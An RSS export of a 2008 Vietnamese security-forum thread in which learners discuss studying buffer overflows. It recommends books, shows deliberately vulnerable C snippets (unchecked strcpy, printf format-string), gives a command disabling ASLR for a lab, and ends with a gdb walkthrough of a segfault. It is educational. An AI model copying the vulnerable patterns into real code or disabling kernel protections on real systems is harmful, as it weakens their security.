+Anh TQN, cái vuln bị segfault khi run mà không có arg gì hết khoai đã hiểu. Code disasm vẫn còn đó nhưng hiện không truy cập được. Hẹn anh vài tháng sẽ trả lời dứt điểm vụ này.
+
+Khoai đã phải test với rất nhiều compilers cũng như rất nhiều bộ libc mới có được một VM tương đối cổ để chơi với mấy cái bof trong lý thuyết. 
+
+<p></p>
+		<cite class="blockquote">anh lamer wrote:</cite><br>
+		<blockquote>Theo kinh nghiệm của mình thì đây thật sự là một cách học sai. Cách học đúng sẽ chỉ cho bạn cách "chỉ điểm". Từ đó mới bắt đầu phát triển lên để vượt rào ASLR này nọ. &nbsp;
+		</blockquote>
+Anh lamer có quyển sách nào chỉ "cách học đúng" để nghiên cứu thêm về vấn đề này thì xin chỉ giáo. Khoai không biết nhiều về coding, nên vớ được quyển nào thấy hay hay là đọc ngay.
+
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141550</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141550</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 12:41:18]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">lQ wrote:</cite><br>
+		<blockquote>ko có args thì có nghĩa là ko tồn tại argv[1], argv[2]&nbsp;
+		</blockquote>
+
+Cách nói chính xác phải là argv[1], argv[2] vẫn tồn tại, nhưng giá trị không được xác định.
+
+<p></p>
+		<cite class="blockquote">TQN wrote:</cite><br>
+		<blockquote>Phải thấy được main() call ra sao và ASM code của main() thì sẽ hiểu được tại sao pagefault.&nbsp;
+		</blockquote>
+
+SegFault trong Linux không giống như PageFault trong Windows. SegFault trong Linux gần với Access Violation trong Windows hơn.
+
+<p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>Anh lamer có quyển sách nào chỉ "cách học đúng" để nghiên cứu thêm về vấn đề này thì xin chỉ giáo. Khoai không biết nhiều về coding, nên vớ được quyển nào thấy hay hay là đọc ngay.&nbsp;
+		</blockquote>
+
+Cuốn sách bạn đang đọc (của Jon Erickson) là cuốn sách hay nhất mình từng biết đến. Nhưng con đường nhanh nhất để hiểu nó là được chỉ dẫn tận tình.
+
+[Quảng cáo]
+Mình làm điều này (dạy tận dụng lỗi phần mềm) ở nước ngoài và trong nước nhiều rồi nên ít hay nhiều mình cũng có chút khả năng đào tạo bài bản. Nếu bạn (hoặc doanh nghiệp của bạn) có nhu cầu thì có thể liên hệ riêng với mình qua email bên dưới.
+[Hết quảng cáo]]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141554</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141554</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 13:28:13]]> GMT</pubDate>
+				<author><![CDATA[ lamer]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Thử sửa chương trình lại thế này
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>int main&#40;int argc, char *argv&#91;&#93;&#41;
+ {
+    char buffer&#91;500&#93;;
+    strcpy&#40;buffer, argv&#91;1&#93;&#41;;
+    printf&#40;argv&#91;3&#93;&#41;;
+ }</pre>
+		</div>
+
+Rồi chạy:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ ./vuln a</pre>
+		</div>
+
+Xem nó có in ra cái gì không? :p
+
+Sau khi đã xơi em này, thử tiếp em này còn độc địa hơn:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>int main&#40;int argc, char *argv&#91;&#93;&#41;
+ {
+    if &#40;argc&#41; exit&#40;0&#41;;
+    printf&#40;argv&#91;3&#93;&#41;;
+    exit&#40;0&#41;;
+ }</pre>
+		</div>
+
+--m
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141564</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141564</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 14:41:38]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">xtinhcau wrote:</cite><br>
+		<blockquote>
+Xin chào các bạn, mình cũng mắc phải một vấn đề như vậy. Nghĩa là, mình đọc sách bắt đầu từ các ví dụ đơn giản và cố gắng hiểu cơ chế của nó. Mình nghĩ là cũng tương đối hiểu cơ chế đó, nhưng cứ đến khi chạy chương trình exploit lại không được như ý muốn. Vậy mình xin hỏi các bạn có kinh nghiệm
+- Tạo 1 "môi trường đơn giản" là như thế nào? (phải chăng phải dựng lại hệ thống với compiler + kernel cũ xưa)
+- Để có thể học đúng cách về BoF thì nên tiến hành các bước cụ thể thế nào? (B1: Thử với "môi trường đơn giản"; B2: Một số vấn đề với các hệ thống ngày nay,...?)
+
+Cảm ơn các bạn. 
+&nbsp;
+		</blockquote>
+
+Như đã nói ở trên, có hai yếu tố ảnh hưởng rất lớn đến việc tìm hiểu về các lỗi memory corruption là compiler và kernel. Nên suy nghĩ của bồ là chính xác. Tuy vậy, không cần phải dựng lại hệ thống, bồ chỉ cần cài đặt compiler cũ (cỡ gcc &lt; 4) và disable các tính năng *bảo vệ* của kernel là được. 
+
+Ví dụ như nếu bồ sử dung Ubuntu, thì chỉ cần làm những việc sau đây:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ sudo apt-get install gcc-3.3
+
+$ sudo su -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"</pre>
+		</div>
+
+là bồ đã có được một môi trường đơn giản để chơi rồi.
+
+--m]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141584</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141584</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 17:06:04]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr.Khoai wrote:</cite><br>
+		<blockquote>
+Anh lamer có quyển sách nào chỉ "cách học đúng" để nghiên cứu thêm về vấn đề này thì xin chỉ giáo. Khoai không biết nhiều về coding, nên vớ được quyển nào thấy hay hay là đọc ngay.
+
+khoai&nbsp;
+		</blockquote>
+
+Theo kinh nghiệm bản thân sau khi đã tham gia khóa học của anh lamer, luyện 1 thời gian, rồi đọc cuốn The art of Exploitation (cả 1st và 2nd edition) thì nhận ra rằng cách viết của cuốn sách là rất hay, có điều, chương trình ví dụ trong đó đưa ra hơi rối, không tối giản đến mức cần thiết để dễ hiểu so với các chương trình ví dụ của anh lamer. Ngay cả với mình sau khi đã học xong, đọc lại cuốn đó mà cũng phải căng mắt ra theo dõi các con số.
+
+Và một điều tất yếu rằng đọc sách sẽ lâu hơn có người "chỉ tận tay, day tận mặt" rồi.
+
+Còn về việc tạo môi trường để thực hành và học hỏi, theo mình, sau khi đã hiểu được bản chất của vấn đề, làm trên những môi trường cổ, bó hẹp trong một phạm vi nào đó (như kernel + compiler) thì việc dùng mánh lới để vượt qua những cách bảo vệ càng ngày càng chặt chẽ của các compiler sau này không phải là quá khó hiểu, cùng là một nguyên tắc mà thôi. Vì thế, đừng quá nôn nóng thắc mắc "Bây giờ compiler nó thay đổi và nhiều cơ chế bảo vệ quá, làm sao các kỹ thuật này áp dụng được đây?"
+
+Vài lời chia sẻ.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141593</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141593</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 17:48:44]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Có thêm một cuốn khá hay về đề tài buffer overflow và nhiều cái khác, bạn tìm xem thử ...
+
+<b>The Shellcoder's Handbook: Discovering and Exploiting Security Holes (2nd Edition)</b>
+
+Thân
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141605</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141605</link>
+				<pubDate><![CDATA[Mon, 14 Jul 2008 18:45:43]]> GMT</pubDate>
+				<author><![CDATA[ 4hfoo]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">4hfoo wrote:</cite><br>
+		<blockquote>Có thêm một cuốn khá hay về đề tài buffer overflow và nhiều cái khác, bạn tìm xem thử ...
+
+<b>The Shellcoder's Handbook: Discovering and Exploiting Security Holes (2nd Edition)</b>
+&nbsp;
+		</blockquote>
+
+Cuốn này có một số lỗi nho nhỏ. Bạn sẽ cần phải rất tỉnh táo để theo dõi và nhận ra lỗi. Theo nhận xét cá nhân mình thì cuốn này không phù hợp cho người mới bắt đầu nghiên cứu.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141646</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141646</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 01:13:34]]> GMT</pubDate>
+				<author><![CDATA[ lamer]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>
+Như đã nói ở trên, có hai yếu tố ảnh hưởng rất lớn đến việc tìm hiểu về các lỗi memory corruption là compiler và kernel. Nên suy nghĩ của bồ là chính xác. Tuy vậy, không cần phải dựng lại hệ thống, bồ chỉ cần cài đặt compiler cũ (cỡ gcc &lt; 4) và disable các tính năng *bảo vệ* của kernel là được. 
+
+Ví dụ như nếu bồ sử dung Ubuntu, thì chỉ cần làm những việc sau đây:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ sudo apt-get install gcc-3.3
+
+$ sudo su -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"</pre>
+		</div>
+
+là bồ đã có được một môi trường đơn giản để chơi rồi.
+
+--m&nbsp;
+		</blockquote>
+Ồ, cám ơn mrro. Ý mình có lẽ là vậy. Nghĩa là, thực tế sách có đưa ra ví dụ, nhưng mình hiểu là với môi trường hệ điều hành của mình thì các giá trị sẽ khác với trong sách, mình đã điều chỉnh các giá trị này theo các giá trị thực tế trên hệ thống mà mình thử nghiệm, tuy nhiên kết quả không được như mong muốn. Vì vậy, khi mrro và các bạn đưa ra ý kiến, mình nghĩ có vẻ như các compiler và kernel "đời mới" có những phương pháp để chống lại BoF. Thực tế bản thân mình cho rằng, các vấn đề kiểu này, khá sát mức hệ thống, các cơ chế khi đọc một diễn giải đầy đủ có thể hiểu được, tuy nhiên khi mình có thể thực thi khai triển được các ví dụ đó thì mức hiểu biết đã tăng lên rất nhiều. 
+OK, Mình sẽ thử xem sao. Cảm ơn các bạn.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141652</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141652</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 01:55:04]]> GMT</pubDate>
+				<author><![CDATA[ xtinhcau]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ @xtinhcau: tôi nghĩ đọc sách những đề tài thế này, thường sẽ dẫn đến hai tình huống:
+
+1. tưởng là hiểu nhưng hóa ra không hiểu gì hết.
+
+2. tưởng là hiểu nhưng hóa ra chỉ là nhớ.
+
+cả hai tình huống này đều dẫn đến một kết quả: làm không được. 
+
+Tôi nghĩ chỉ nên nghĩ là "đã hiểu" một khi có thể tự phân tích và tự giải quyết được những vấn đề tương tự nhưng <b>khác hoặc mới hơn</b> những vấn đề mà sách đưa ra. 
+
+Kiến thức mà mình tự gain được, bao giờ cũng bền chắc hơn rất nhiều kiến thức mà người khác nhồi vào đầu mình.
+
+Nên người thầy mà dạy tốt, là người chỉ hướng dẫn, chứ không làm thay, rồi để học trò tự giải quyết vấn đề của họ. Sách thường kô làm được điều này, bởi lẽ nó không có tương tác giữa thầy và trò, dẫn đến việc sách nói một đường, trò hiểu một nẻo, nhưng sách không có cách nào để nhận ra là trò đang hiểu sai, để kịp thời điều chỉnh. Một vấn đề nữa là sách thường hay lan man, nói những thứ không cần thiết. Còn thầy thì, nhờ kinh nghiệm, biết rõ cái gì là cần thiết, cần phải tập trung vào đó.
+
+Nói chung là nên tìm một ông thầy tốt như anh lamer :p.
+
+--m
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141654</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141654</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 02:42:04]]> GMT</pubDate>
+				<author><![CDATA[ mrro]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>
+Nên người thầy mà dạy tốt, là người chỉ hướng dẫn, chứ không làm thay, rồi để học trò tự giải quyết vấn đề của họ. Sách thường kô làm được điều này, bởi lẽ nó không có tương tác giữa thầy và trò, dẫn đến việc sách nói một đường, trò hiểu một nẻo, nhưng sách không có cách nào để nhận ra là trò đang hiểu sai, để kịp thời điều chỉnh. Một vấn đề nữa là sách thường hay lan man, nói những thứ không cần thiết. Còn thầy thì, nhờ kinh nghiệm, biết rõ cái gì là cần thiết, cần phải tập trung vào đó.
+
+Nói chung là nên tìm một ông thầy tốt như anh lamer :p.
+
+--m
+&nbsp;
+		</blockquote>
+Vậy chứ tui không kiếm được thầy thì sao <b><font color='orange'>mrro</font></b>?
+
+anh lamer: Anh coi rảnh rỗi lúc train cho mrro đi kìa, em thấy mrro hâm mộ anh quá trời  :D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141667</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141667</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 08:05:08]]> GMT</pubDate>
+				<author><![CDATA[ FaL]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">FaL wrote:</cite><br>
+		<blockquote>
+anh lamer: Anh coi rảnh rỗi lúc train cho mrro đi kìa, em thấy mrro hâm mộ anh quá trời  :D &nbsp;
+		</blockquote>
+
+Mình thì nghĩ ngược lại, mình nghĩ là mrro được anh lamer train rồi nên mới nói thế đó chứ :P]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141709</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141709</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 14:44:19]]> GMT</pubDate>
+				<author><![CDATA[ mybb]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Khi nào lamer có làm cái free seminar hay trainning, nhớ cho tui đi theo, làm bảo vệ hay gì gì đó cũng được, để xem và học hỏi với nhé ;)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141723</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141723</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 15:32:05]]> GMT</pubDate>
+				<author><![CDATA[ TQN]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ đang hí hửng tưởng có VNSECON để vào HCM chơi. Hình như năm nay ko làm nữa thì phải. 
+
+Thế học phí tôn sư là bao nhiêu hở bác lamer ;;). Để anh em còn biết đường :D ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141729</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141729</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 15:44:27]]> GMT</pubDate>
+				<author><![CDATA[ K4i]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>@xtinhcau: tôi nghĩ đọc sách những đề tài thế này, thường sẽ dẫn đến hai tình huống:
+
+1. tưởng là hiểu nhưng hóa ra không hiểu gì hết.
+
+2. tưởng là hiểu nhưng hóa ra chỉ là nhớ.
+
+cả hai tình huống này đều dẫn đến một kết quả: làm không được. 
+
+Tôi nghĩ chỉ nên nghĩ là "đã hiểu" một khi có thể tự phân tích và tự giải quyết được những vấn đề tương tự nhưng <b>khác hoặc mới hơn</b> những vấn đề mà sách đưa ra. 
+&nbsp;
+		</blockquote>
+Um, ở đây mình mới "hiểu ý sách nói gì", còn như mình đã nói khi thực hiện được các bài tập đó thì mức hiểu đã được nâng tầm: hiểu về hệ thống, biến thành kiến thức của mình,... Mình nghĩ mình ý thức rất rõ điều đó :)
+<p></p>
+		<cite class="blockquote">mrro wrote:</cite><br>
+		<blockquote>
+Kiến thức mà mình tự gain được, bao giờ cũng bền chắc hơn rất nhiều kiến thức mà người khác nhồi vào đầu mình.
+
+Nên người thầy mà dạy tốt, là người chỉ hướng dẫn, chứ không làm thay, rồi để học trò tự giải quyết vấn đề của họ. Sách thường kô làm được điều này, bởi lẽ nó không có tương tác giữa thầy và trò, dẫn đến việc sách nói một đường, trò hiểu một nẻo, nhưng sách không có cách nào để nhận ra là trò đang hiểu sai, để kịp thời điều chỉnh. Một vấn đề nữa là sách thường hay lan man, nói những thứ không cần thiết. Còn thầy thì, nhờ kinh nghiệm, biết rõ cái gì là cần thiết, cần phải tập trung vào đó.
+
+Nói chung là nên tìm một ông thầy tốt như anh lamer :p.
+
+--m
+&nbsp;
+		</blockquote> 
+Hì, được học hỏi một ai đó giỏi và có kinh nghiệm, đặc biệt với một số vấn đề gai góc thì ai cũng muốn. Tuy nhiên không cái gì muốn cũng được :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141762</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141762</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 19:20:02]]> GMT</pubDate>
+				<author><![CDATA[ xtinhcau]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Em đề nghị là mở free seminar]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141795</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#141795</link>
+				<pubDate><![CDATA[Tue, 15 Jul 2008 23:24:41]]> GMT</pubDate>
+				<author><![CDATA[ Tal]]></author>
+			</item>
+			<item>
+				<title>Re: [Hỏi] - Vài điều về buffer overflow</title>
+				<description><![CDATA[ Anh TQN, như lời hẹn, hôm nay em có thời gian sẽ trả lời vụ segmentation fault của chương trình vuln.
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>$ cat -n vuln.c
+     1  /*
+     2   * vuln.c
+     3   */
+     4  int
+     5  main&#40;int argc, char *argv&#91;&#93;&#41;
+     6  {
+     7          char buf&#91;500&#93;;
+     8          strcpy &#40;buf, argv&#91;1&#93;&#41;;
+     9          return 0;
+    10  }
+$ gcc -o vuln -g vuln.c
+$ gdb -q vuln
+&#40;gdb&#41; disas main
+Dump of assembler code for function main:
+0x8048328 &lt;main&gt;:       push   ebp
+0x8048329 &lt;main+1&gt;:     mov    ebp,esp
+0x804832b &lt;main+3&gt;:     sub    esp,0x208
+0x8048331 &lt;main+9&gt;:     and    esp,0xfffffff0
+0x8048334 &lt;main+12&gt;:    mov    eax,0x0
+0x8048339 &lt;main+17&gt;:    sub    esp,eax
+0x804833b &lt;main+19&gt;:    sub    esp,0x8
+0x804833e &lt;main+22&gt;:    mov    eax,DWORD PTR &#91;ebp+12&#93;;Có lẽ là lea của argv&#91;1&#93;
+0x8048341 &lt;main+25&gt;:    add    eax,0x4
+0x8048344 &lt;main+28&gt;:	push   DWORD PTR &#91;eax&#93;; push địa chỉ của argv&#91;1&#93;?
+0x8048346 &lt;main+30&gt;:	lea    eax,&#91;ebp-520&#93; ;load địa chỉ của buf
+0x804834c &lt;main+36&gt;:	push   eax ; push buf lên?
+0x804834d &lt;main+37&gt;:	call   0x8048268 &lt;strcpy&gt;
+0x8048352 &lt;main+42&gt;:	add    esp,0x10
+0x8048355 &lt;main+45&gt;:	mov    eax,0x0
+0x804835a &lt;main+50&gt;:	leave  
+0x804835b &lt;main+51&gt;:	ret    
+End of assembler dump.
+&#40;gdb&#41;</pre>
+		</div>
+Đầu tiên set breakpoint ngay tại strcpy (dòng số 8) và run với một argument là test như sau:
+<blockquote>
+(gdb) b 8
+Breakpoint 1 at 0x804833b: file vuln.c, line 8.
+(gdb) r test
+Starting program: /home/khoai/vuln test
+
+Breakpoint 1, main (argc=2, <font color='yellow'>argv=0xbffffb14</font>) at vuln.c:8
+8		strcpy (buf, argv[1]);
+(gdb)&nbsp;
+		</blockquote>
+Chú ý argv trỏ đến 0xbffffb14, là một địa chỉ trên stack nơi mà input argument 0 sẽ trỏ đến. Địa chỉ của argv này là ở đâu? Và có liên quan đến cái stack của mình như thế nào:
+<blockquote>
+(gdb) x/ &argv
+0xbffffac4:	0xbffffb14
+(gdb) x/4x $ebp
+0xbffffab8:	0xbffffae8	<font color='red'>0x40030bb4</font>	0x00000002	<font color='yellow'>0xbffffb14</font>
+(gdb) x/4x 0xbffffb14
+0xbffffb14:	0xbffffc0d	0xbffffc1e	0x00000000	0xbffffc23
+(gdb) x/s 0xbffffc0d
+0xbffffc0d:	 "/home/khoai/vuln"
+(gdb) x/s 0xbffffc1e
+0xbffffc1e:	 "test"
+&nbsp;
+		</blockquote>
+Như vậy, ta có thể hình dung phần stack của mình như sau:
+<blockquote>
+High mem &lt;------------------------------------&gt; Low mem
+<font color='yellow'>[argv]</font>[argc]<font color='red'>[old EIP]</font>[old EBP][...buf...]
+&nbsp;
+		</blockquote>
+
+argv -&gt;0xbffffb14-&gt;0xbffffc0d là string /home/khoai/vuln. Còn argv[1] -&gt; 0xbffffc1e là string "test".Thử chạy lại vuln, giữ nguyên cái breakpoint nhưng lần này không cho tham số nào cả xem cái stack của mình như thế nào:
+<blockquote>
+(gdb) r
+Starting program: /home/khoai/vuln 
+
+Breakpoint 1, main (argc=1, argv=<font color='yellow'>0xbffffb14</font>) at vuln.c:8
+8		strcpy (buf, argv[1]);
+(gdb) x/4x $ebp
+0xbffffab8:	0xbffffae8	0x40030bb4	0x00000001	<font color='yellow'>0xbffffb14</font>
+&nbsp;
+		</blockquote>
+Lần này, argv -&gt; 0xbffffb14, còn argc = 1. Thử xem ngay tại 0xbffffb14 có gì hấp dẫn:
+<blockquote>
+(gdb) x/4x 0xbffffb14
+0xbffffb14:	0xbffffc12	0x00000000	0xbffffc23	0xbffffc52
+(gdb) x/s 0xbffffc12
+0xbffffc12:	 "/home/khoai/vuln"
+&nbsp;
+		</blockquote>
+Vậy argv[0] -&gt; "/home/khoai/vuln", còn argv[1] = 0. Khi strcpy được gọi, nó sẽ cố gắng truy cập vào vùng nhớ 0x0, dẫn đến tình trạng segmentation fault.
+
+Ai rãnh rỗi có thể mò thêm tại 0xbffffb1c (argv[0] + 2) có gì hấp dẫn.
+khoai]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/20243.hva#150743</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/20243.hva#150743</link>
+				<pubDate><![CDATA[Thu, 11 Sep 2008 21:20:12]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+	</channel>
+</rss>
